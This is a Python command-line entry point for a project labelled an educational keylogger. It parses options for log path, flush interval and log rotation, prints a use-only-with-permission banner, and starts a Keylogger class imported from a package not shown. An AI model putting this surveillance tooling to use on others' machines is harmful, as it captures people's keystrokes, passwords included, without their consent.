#!/usr/bin/env python3
"""
main.py — CLI entry point for the keylogger project.

Examples
--------
  python main.py                          # use defaults from config.py
  python main.py --log logs/custom.txt    # custom log path
  python main.py --flush 5 --rotate 200  # flush every 5 keys, rotate at 200 KB
  python main.py --no-timestamp           # omit session headers
"""

import argparse
from keylogger import Keylogger
from keylogger.config import LOG_FILE, FLUSH_EVERY, ROTATE_KB


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Educational keylogger — cybersecurity project",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "--log",
        default=LOG_FILE,
        metavar="PATH",
        help="Path to the output log file",
    )
    parser.add_argument(
        "--flush",
        type=int,
        default=FLUSH_EVERY,
        metavar="N",
        help="Flush buffer to disk every N keystrokes",
    )
    parser.add_argument(
        "--rotate",
        type=int,
        default=ROTATE_KB,
        metavar="KB",
        help="Rotate log when it exceeds this size in KB",
    )
    parser.add_argument(
        "--no-timestamp",
        action="store_true",
        help="Omit the session timestamp header",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()

    print("=" * 60)
    print("  Keylogger — Educational Cybersecurity Project")
    print("  Use ONLY on systems you own or have permission to test.")
    print("=" * 60)

    logger = Keylogger(
        log_file    = args.log,
        flush_every = args.flush,
        rotate_kb   = args.rotate,
        timestamp   = not args.no_timestamp,
    )
    logger.start()


if __name__ == "__main__":
    main()
